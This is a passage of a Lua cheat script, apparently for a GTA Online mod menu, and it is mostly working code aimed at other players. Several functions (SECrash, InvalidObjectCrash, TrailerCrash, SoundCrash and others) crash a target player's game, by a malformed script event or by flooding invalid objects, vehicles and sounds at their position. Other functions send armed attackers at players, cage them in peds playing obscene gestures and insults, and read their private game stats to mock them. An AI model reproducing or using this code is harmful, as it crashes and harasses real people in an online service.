                            local a1 = entities.create_object(-930879665, cord)
                            util.yield(10)
                            local a2 = entities.create_object(3613262246, cord)
                            util.yield(10)
                            local b1 = entities.create_object(452618762, cord)
                            util.yield(10)
                            local b2 = entities.create_object(3613262246, cord)
                            util.yield(300)
                            entities.delete_by_handle(a1)
                            entities.delete_by_handle(a2)
                            entities.delete_by_handle(b1)
                            entities.delete_by_handle(b2)
                            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(452618762)
                            util.yield(10)
                            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(3613262246)
                            util.yield(10)
                            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(-930879665)
                            util.yield(10)
                            end
                            if SE_Notifications then
                                notification("Memoir完成对他的制裁！.",colors.red)
                            end
                        end
                        function daziran2(PlayerID)
                            local user = players.user()
                            local user_ped = players.user_ped()
                            local pos = players.get_position(user)
                            BlockSyncs(PlayerID, function()
                                util.yield(100)
                                menu.trigger_commands("invisibility on")
                                for i = 0, 110 do
                                    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, 0xFBF7D21F)
                                    PED.SET_PED_COMPONENT_VARIATION(user_ped, 5, i, 0, 0)
                                    util.yield(50)
                                    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
                                end
                                util.yield(250)
                                for i = 1, 5 do
                                    util.spoof_script("freemode", SYSTEM.WAIT)
                                end
                                ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
                                NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
                                PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
                                menu.trigger_commands("invisibility off")
                            end)
                        end

                        local function SECrash(PlayerID)
    util.trigger_script_event(1 << PlayerID, { 962740265, PlayerID , 115831, 9999449 })
end

local function InvalidObjectCrash(PlayerID)
    BlockSyncs(PlayerID, function() 
	local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
	local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local Object_pizza1 = CreateObject(3613262246, TargetPlayerPos)
    local Object_pizza2 = CreateObject(2155335200, TargetPlayerPos)
    local Object_pizza3 = CreateObject(3026699584, TargetPlayerPos)
    local Object_pizza4 = CreateObject(-1348598835, TargetPlayerPos)
    for i = 0, 100 do 
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        util.yield(10)
    end
    util.yield(2000)
    entities.delete_by_handle(Object_pizza1)
    entities.delete_by_handle(Object_pizza2)
    entities.delete_by_handle(Object_pizza3)
    entities.delete_by_handle(Object_pizza4)
    end)
end

local function InvalidClothesCrash(PlayerID)
    BlockSyncs(PlayerID, function() 
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local SelfPlayerPed = PLAYER.PLAYER_PED_ID();
        local Spawned_Mike = CreatePed(26, util.joaat("player_zero"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        for i = 0, 500 do
            PED.SET_PED_COMPONENT_VARIATION(Spawned_Mike, 0, 0, math.random(0, 10), 0)
			ENTITY.SET_ENTITY_COORDS(Spawned_Mike, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false, false, true);
            util.yield(10)
        end
        entities.delete_by_handle(Spawned_Mike)
     end)
end

local function TrailerCrash(PlayerID)
         local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
         local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
         SpawnedDune1 = CreateVehicle(util.joaat("dune"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
         ENTITY.FREEZE_ENTITY_POSITION(SpawnedDune1, true)
         SpawnedDune2 = CreateVehicle(util.joaat("dune"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
         ENTITY.FREEZE_ENTITY_POSITION(SpawnedDune2, true)
         SpawnedBarracks1 = CreateVehicle(util.joaat("barracks"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
         ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks1, true)
         SpawnedBarracks2 = CreateVehicle(util.joaat("barracks"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
         ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks2, true)
         SpawnedTowtruck = CreateVehicle(util.joaat("towtruck2"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
         ENTITY.FREEZE_ENTITY_POSITION(SpawnedTowtruck, true)
         SpawnedBarracks31 = CreateVehicle(util.joaat("barracks3"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
         ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks31, true)
         SpawnedBarracks32 = CreateVehicle(util.joaat("barracks3"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
         ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks32, true)
         ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks31, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
         ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks32, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
         ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks1, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
         ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks2, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
         ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedDune1, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
         	ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedDune2, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        for i = 0, 100 do 
            TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SpawnedTowtruck, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            util.yield(10)
        end
        util.yield(2000)
        entities.delete_by_handle(SpawnedTowtruck)
        entities.delete_by_handle(SpawnedDune1)
        entities.delete_by_handle(SpawnedDune2)
        entities.delete_by_handle(SpawnedBarracks31)
        entities.delete_by_handle(SpawnedBarracks32)
        entities.delete_by_handle(SpawnedBarracks1)
        entities.delete_by_handle(SpawnedBarracks2)
end

local function SoundCrash(PlayerID)
    BlockSyncs(PlayerID, function() 
        util.yield(100)
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 'MP_MISSION_COUNTDOWN_SOUNDSET', true, 1000, false)
            end
        util.yield()
        end
     end)
end

local function OpenParachuteCrash(PlayerID)
    local user = players.user()
    local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
    local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    BlockSyncs(PlayerID, function() 
        util.yield(100)
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, 0xFBF7D21F)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 100, false)
        TASK.TASK_PARACHUTE_TO_TARGET(SelfPlayerPed, SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z)
        util.yield(200)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(SelfPlayerPed)
        util.yield(500)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 100, false)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        util.yield(1000)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(SelfPlayerPed, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z, 0, false, false, 0)
    end)
end

local function ChangeParachuteCrash(PlayerID)
    local user = players.user()
    local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
    local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    BlockSyncs(PlayerID, function() 
        util.yield(100)
        for i = 0, 110 do
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, 0xFBF7D21F)
            PED.SET_PED_COMPONENT_VARIATION(SelfPlayerPed, 5, i, 0, 0)
            util.yield(50)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        end
        util.yield(250)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(SelfPlayerPed, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z, 0, false, false, 0)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
    end)
end

local function DogCrash(PlayerID)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
    local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    
    BlockSyncs(PlayerID, function() 
        for i = 1, 10 do
            local ped1 = CreatePed(26, util.joaat('a_c_poodle'), ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(TargetPlayerPed, 0, 3, 0), 0) 
            local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
            WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
            local obj
            repeat
                obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
            until obj ~= 0 or util.yield()
            ENTITY.DETACH_ENTITY(obj, true, true) 
            util.yield(50)
            FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
            entities.delete_by_handle(ped1)
            util.yield(150)
        end
     end)
end
                        
        --======
function daoqizhanma()
    Streament(charger.charg)
    Streament(charger.emp)
    local pedSi = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    local pCoor = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local pH = ENTITY.GET_ENTITY_HEADING(pCoor)

        if players.is_in_interior(players.user()) ==true then
            if set.alert then
                util.toast('不要在室内生成道奇战马')
            end
            menu.set_value(Spawn, false)
            return
        end

    if PED.IS_PED_IN_VEHICLE(players.user_ped(), FFchar, true) ==false and PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) ==true then
        local curcar = entities.get_user_vehicle_as_handle()
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(curcar)
        entities.delete_by_handle(curcar)
        if set.alert then
            util.toast('已为您更换新的')
        end
        Ccreate(pCoor, pedSi)

        elseif PED.IS_PED_IN_VEHICLE(players.user_ped(), FFchar, true) ==true then
            Magout()
        elseif PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) ==false then
                Ccreate(pCoor, pedSi)
                 if set.alert then
                    util.toast('道奇战马已生成')
                 end
        end

if PED.IS_PED_GETTING_INTO_A_VEHICLE(players.user_ped()) ==false and PED.IS_PED_IN_VEHICLE(players.user_ped(), FFchar , false) ==false
            then
                if set.alert then
                    util.toast('已离开道奇战马,道奇战马已被删除')
                end
        ---@diagnostic disable-next-line: param-type-mismatch
              menu.set_value(Spawn, false)
              ENTITY.SET_ENTITY_AS_MISSION_ENTITY(FFchar)
              entities.delete_by_handle(FFchar)
              ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Empa)
              entities.delete_by_handle(Empa)
              menu.delete(Mag_int)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(charger.charg)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(charger.emp)

              util.stop_thread()

            end
        end
        function request_model_load(hash)
            request_time = os.time()
            if not STREAMING.IS_MODEL_VALID(hash) then
                return
            end
            STREAMING.REQUEST_MODEL(hash)
            while not STREAMING.HAS_MODEL_LOADED(hash) do
                if os.time() - request_time >= 10 then
                    break
                end
                util.yield()
            end
        end
        local givegun = false
num_attackers = 1

function send_attacker(hash, pid, givegun)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
    coords.x = coords['x']
    coords.y = coords['y']
    coords.z = coords['z']
    request_model_load(hash)
    for i=1, num_attackers do
        local attacker = entities.create_ped(28, hash, coords, math.random(0, 270))
        if godmodeatk then
            ENTITY.SET_ENTITY_INVINCIBLE(attacker, true)
        end
        TASK.TASK_COMBAT_PED(attacker, target_ped, 0, 16)
        PED.SET_PED_ACCURACY(attacker, 100.0)
        PED.SET_PED_COMBAT_ABILITY(attacker, 2)
        PED.SET_PED_AS_ENEMY(attacker, true)
        PED.SET_PED_FLEE_ATTRIBUTES(attacker, 0, false)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 46, true)
        if givegun then
            WEAPON.GIVE_WEAPON_TO_PED(attacker, atkgun, 0, false, true)
        end
    end
end
Colour = {}
Colour.new = function(R, G, B, A)
    return {r = R or 0, g = G or 0, b = B or 0, a = A or 0}
end

function request_fx_asset(asset)
	STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
	while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
		util.yield()
	end
end
function openlight()
    local localPed = PLAYER.PLAYER_PED_ID()
    local fect = Effect.new("scr_xm_farm", "scr_xm_dst_elec_crackle")
    local effect = Effect.new("scr_ie_tw", "scr_impexp_tw_take_zone")
    local colour = Colour.new(5, 0, 0, 30)
    local colour2 = Colour.new(5, 50, 10, 30)
    request_fx_asset(effect.asset)
    GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
    GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
        effect.name,
        localPed,
        0.0, 0.0, 0.75,
        0.0, 0.0, 0.0,
        0.09,
        false, false, false)
    GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
    GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour2.r, colour2.g, colour2.b)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
        effect.name,
        localPed,
        0.0, 0.0, -2.9,
        0.0, 0.0, 0.0,
        1.0,
        false, false, false)
end
function clgr()
    if PAD.IS_CONTROL_PRESSED(46, 46) then
        local target = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), math.random(-5, 5), -30.0, math.random(-5, 5))
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(target['x'], target['y'], target['z'], target['x'], target['y'], target['z'], 100.0, true, 1198879012, players.user_ped(), true, false, 100.0)
    end
end
        function guanbilongzi(pid)
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                for i = 1, 20 do
                send_attacker(-1788665315, pid, false)
                util.yield(1)
                end
                local coords = ENTITY.GET_ENTITY_COORDS(ped, true)
                coords.x = coords['x']
                coords.y = coords['y']
                coords.z = coords['z']
                local hash = 779277682
                request_model_load(hash)
                local cage1 = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, coords['x'], coords['y'], coords['z'], true, false, false)
                ENTITY.SET_ENTITY_ROTATION(cage1, 0.0, -90.0, 0.0, 1, true)
                local cage2 = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, coords['x'], coords['y'], coords['z'], true, false, false)
                ENTITY.SET_ENTITY_ROTATION(cage2, 0.0, 90.0, 0.0, 1, true)
        end
function get_lapdances_amount(pid) 
    return memory.read_int(memory.script_global(1853348 + 1 + (pid * 834) + 205 + 55))
end
function get_prostitutes_solicited(pid)
    return memory.read_int(memory.script_global(1853348 + 1 + (pid * 834) + 205 + 54))
end
function get_horniest_player()
    local highest_horniness = 0
    local horniest = 0
    local most_lapdances = 0
    local most_prostitutes = 0
    for k,p in pairs(players.list(true, true, true)) do
        lapdances = get_lapdances_amount(p)
        prostitutes = get_prostitutes_solicited(p)
        horniness = lapdances + prostitutes
        if horniness > highest_horniness then
            highest_horniness = horniness
            horniest = p
            most_lapdances = lapdances
            most_prostitutes = prostitutes
        end
    end
    if horniness == nil then
        util.toast("找不到最性奋的玩家。")
        return
    end
    if highest_horniness ~= 0 then
        return PLAYER.GET_PLAYER_NAME(horniest) .. " 是战局中最性奋的玩家!他们的角色招来了 " .. most_prostitutes .. " 妓女,并为 " .. most_lapdances .. " 次脱衣舞付钱!"
    else
        util.toast("找不到最性奋的玩家。")
        return nil
    end
end
defaultHealth = ENTITY.GET_ENTITY_MAX_HEALTH(PLAYER.PLAYER_PED_ID())
moddedHealth = defaultHealth
function custom_health(toggle)
    UsingModHealth = toggle
    local localPed = PLAYER.PLAYER_PED_ID()
    if UsingModHealth then
        PED.SET_PED_MAX_HEALTH(localPed, moddedHealth)
        ENTITY.SET_ENTITY_HEALTH(localPed, moddedHealth)
    else
        PED.SET_PED_MAX_HEALTH(localPed, defaultHealth)
        menu.trigger_command(moddedHealthSlider, defaultHealth) 
        if ENTITY.GET_ENTITY_HEALTH(localPed) > defaultHealth then
            ENTITY.SET_ENTITY_HEALTH(localPed, defaultHealth)
        end
    end
end
function cheliangspeed2()
local veh = entities.get_user_vehicle_as_handle()
    if veh ~= nil then
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
        end
        VEHICLE.MODIFY_VEHICLE_TOP_SPEED(veh, num_for_torque)
        ENTITY.SET_ENTITY_MAX_SPEED(veh, num_for_torque)
    end
end

function newTimer()
	local self = {start = util.current_time_millis()}
	local function reset()
		self.start = util.current_time_millis()
	end
	local function elapsed()
		return util.current_time_millis() - self.start
	end
	return
	{
		reset = reset,
		elapsed = elapsed
	}
end
function Delcar(vic)
    if PED.IS_PED_IN_ANY_VEHICLE(vic) ==true then
        local tarcar = PED.GET_VEHICLE_PED_IS_IN(vic, true)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(tarcar)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(tarcar)
        entities.delete_by_handle(tarcar)
    end
end
cages = {} 
function cage_player(pos)
	local object_hash = util.joaat("prop_gold_cont_01b")
	pos.z = pos.z-0.9
	
	STREAMING.REQUEST_MODEL(object_hash)
	while not STREAMING.HAS_MODEL_LOADED(object_hash) do
		util.yield()
	end
	local object1 = OBJECT.CREATE_OBJECT(object_hash, pos.x, pos.y, pos.z, true, true, true)
	cages[#cages + 1] = object1																			

	local object2 = OBJECT.CREATE_OBJECT(object_hash, pos.x, pos.y, pos.z, true, true, true)
	cages[#cages + 1] = object2
	

	ENTITY.FREEZE_ENTITY_POSITION(object1, true)
	ENTITY.FREEZE_ENTITY_POSITION(object2, true)
	local rot  = ENTITY.GET_ENTITY_ROTATION(object2)
	rot.x = -180
	rot.y = -180
	ENTITY.SET_ENTITY_ROTATION(object2, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(object_hash)
end
function SetPedCoor(pedS, tarx, tary, tarz)
    ENTITY.SET_ENTITY_COORDS(pedS, tarx, tary, tarz, false, true, true, false)
end
function Pedspawn(tar1)

    Ped_mdl = Ped_mdl or 'ig_lestercrest'
    Pedhash = util.joaat(Ped_mdl)
    Streament(Pedhash)
    local pedS = entities.create_ped(1, Pedhash, tar1, 0)
    ENTITY.SET_ENTITY_INVINCIBLE(pedS, true)
    ENTITY.FREEZE_ENTITY_POSITION(pedS, true)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(pedS, true)
    PED.SET_PED_CAN_LOSE_PROPS_ON_DAMAGE(pedS, false)
    if Pedhash == util.joaat('ig_lestercrest') then
        PED.SET_PED_PROP_INDEX(pedS, 1)
    end

    return pedS
end
function Teabagtime(p1, p2, p3, p4, p5, p6, p7, p8)
    util.create_tick_handler (function ()
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p1, 'LES1A_DHAC', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p2, 'TUSCO_AHAD', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p3, 'LES1A_DHAC', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p4, 'TUSCO_AHAD', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p5, 'LES1A_DHAC', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p6, 'TUSCO_AHAD', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p7, 'LES1A_DHAC', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p8, 'TUSCO_AHAD', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
--AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p1, 'HS3LE_ANAB', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        util.yield(100)
        end)
end
function Streamanim(anim) --Streaming Model
    STREAMING.REQUEST_ANIM_DICT(anim)
    while STREAMING.HAS_ANIM_DICT_LOADED(anim) ==false do
        STREAMING.REQUEST_ANIM_DICT(anim)
        util.yield()
    end
end
function pedcageg(pid)
    local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
    local pname = PLAYER.GET_PLAYER_NAME(pid)
    if not cage_table[pid] then
        local peds = {}
    
        Delcar(targets)
        
    
    local p1 = Pedspawn(tar1)
    local p2 = Pedspawn(tar1)
    local p3 = Pedspawn(tar1)
    local p4 = Pedspawn(tar1)
    local p5 = Pedspawn(tar1)
    local p6 = Pedspawn(tar1)
    local p7 = Pedspawn(tar1)
    local p8 = Pedspawn(tar1)
    
    SetPedCoor(p1, tar1.x, tar1.y - 0.5, tar1.z - 1.0)
    SetPedCoor(p2, tar1.x - 0.5, tar1.y - 0.5, tar1.z - 1.0)
    SetPedCoor(p3, tar1.x - 0.5, tar1.y, tar1.z - 1.0)
    SetPedCoor(p4, tar1.x - 0.5, tar1.y + 0.5, tar1.z - 1.0)
    SetPedCoor(p5, tar1.x, tar1.y + 0.5, tar1.z - 1.0)
    SetPedCoor(p6, tar1.x + 0.5, tar1.y + 0.5, tar1.z - 1.0)
    SetPedCoor(p7, tar1.x + 0.5, tar1.y, tar1.z - 1.0)
    SetPedCoor(p8, tar1.x + 0.5, tar1.y - 0.5, tar1.z - 1.0)

    if Pedhash == util.joaat('IG_LesterCrest')  then
        Teabagtime(p1, p2, p3, p4, p5, p6, p7, p8)
    elseif Pedhash == util.joaat('player_two') then
        Trevortime(p1, p2, p3, p4, p5, p6, p7, p8)
    elseif Pedhash ~= util.joaat('IG_LesterCrest') or util.joaat('player_two') then
    if AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(p1, 'GENERIC_FUCK_YOU') ==true 
    then Fuckyou(peds)
    
    elseif AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(p1, 'Provoke_Trespass')
    then Provoke(peds)
    
    elseif AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(p1, 'Generic_Insult_High')
    then Insulthigh(peds)
    
    elseif AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(p1, 'GENERIC_WAR_CRY')
    then Warcry(peds) 
    else
    end
    end
    function Runanim(ent, animdict, anim)
        TASK.TASK_PLAY_ANIM(ent, animdict, anim, 1.0, 1.0, -1, 3, 0.5, false, false, false)
        while ENTITY.IS_ENTITY_PLAYING_ANIM(ent, animdict, anim, 3) ==false do
            TASK.TASK_PLAY_ANIM(ent, animdict, anim, 1.0, 1.0, -1, 3, 0.5, false, false, false)
            util.yield()
        end
    end
    function PFP(pedm, playerm)--Ped Facing Player adapted from PhoenixScript
        local ppos = ENTITY.GET_ENTITY_COORDS(playerm)
        local pmpos = ENTITY.GET_ENTITY_COORDS(pedm)
        local hx = ppos.x - pmpos.x
        local hy = ppos.y - pmpos.y
        local head = MISC.GET_HEADING_FROM_VECTOR_2D(hx, hy)
        return ENTITY.SET_ENTITY_HEADING(pedm, head)
    end
    function IPM(targets, tar1, pname, cage_table, pid)
        local tar2 = ENTITY.GET_ENTITY_COORDS(targets)
        Disbet = SYSTEM.VDIST2(tar2.x, tar2.y, tar2.z, tar1.x, tar1.y, tar1.z)
        if Disbet <= 0.5  then
        util.toast(pname.."被困住")
        util.yield(800)
    
        elseif Disbet >= 0.5  then
        util.yield(800)
        util.toast(pname.."挣脱了")
        DelEnt(cage_table[pid])
        cage_table[pid] = false
        Stopsound()
        end
    end
          -----------Anim-------------------------
          Streamanim('rcmpaparazzo_2')
          Streamanim('mp_player_int_upperfinger')
          Streamanim('switch@trevor@jerking_off')
          local ped_anim = {p2, p3, p4, p5, p6, p7, p8}
          for _, Pedanim in ipairs(ped_anim) do
              if Pedhash == util.joaat('player_two') then
                  Runanim(Pedanim, 'switch@trevor@jerking_off','trev_jerking_off_loop')
              else Runanim(Pedanim, 'mp_player_int_upperfinger', 'mp_player_int_finger_02_fp')
              end
      
              Runanim(p1, 'rcmpaparazzo_2', 'shag_loop_a')
      end
          local ped_tab = {p1, p2, p3, p4, p5, p6, p7, p8}
          for _, spawned_ped in ipairs(ped_tab) do
              table.insert(peds,  spawned_ped)
          end
      
      
      for _, Pedm in ipairs(peds) do
          PFP(Pedm, targets) --- ped facing player
      end
      
      
      cage_table[pid] = peds
      end --if not cage_table[pid] end
      
      while cage_table[pid] do
      IPM(targets, tar1, pname, cage_table, pid)
      
      
      end
      
      
      if not players.exists(pid) then
          
          util.toast('You made them rage quit')
          util.stop_thread()
      
          cage_table[pid] = nil
      end
      end
      --解除Ped笼
      function DelEnt(ped_tab)
          for _, Pedm in ipairs(ped_tab) do
              ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Pedm)
              entities.delete_by_handle(Pedm)
          end
      end
      function get_closest_veh(coords)
        local closest = nil
        local closest_dist = 1000000
        local this_dist = 0
        for _, veh in pairs(entities.get_all_vehicles_as_handles()) do 
            this_dist = v3.distance(coords, ENTITY.GET_ENTITY_COORDS(veh))
            if this_dist < closest_dist  and ENTITY.GET_ENTITY_HEALTH(veh) > 0 then
                closest = veh
                closest_dist = this_dist
            end
        end
        if closest ~= nil then 
            return {closest, closest_dist}
        else
            return nil 
        end
    end
    
    function get_closest_ped(coords)
        local closest = nil
        local closest_dist = 1000000
        local this_dist = 0
        for _, ped in pairs(entities.get_all_peds_as_handles()) do 
            this_dist = v3.distance(coords, ENTITY.GET_ENTITY_COORDS(ped))
            if this_dist < closest_dist and not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped)  and not PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                closest = ped
                closest_dist = this_dist
            end
        end
        if closest ~= nil then 
            return {closest, closest_dist}
        else
            return nil 
        end
    end
    function get_closest_ped_to_ped(coords, init_ped)
        local coords = ENTITY.GET_ENTITY_COORDS(init_ped)
        local closest = nil
        local closest_dist = 1000000
        local this_dist = 0
        for _, ped in pairs(entities.get_all_peds_as_handles()) do 
